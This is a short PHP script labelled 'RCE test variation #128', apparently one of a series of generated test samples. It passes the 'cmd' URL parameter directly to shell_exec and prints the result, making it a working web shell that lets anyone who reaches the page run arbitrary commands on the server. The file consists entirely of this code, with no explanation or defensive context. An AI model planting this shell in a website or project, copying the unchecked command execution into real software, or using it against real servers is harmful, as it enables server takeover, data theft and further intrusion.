<?php
// RCE test variation #128
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>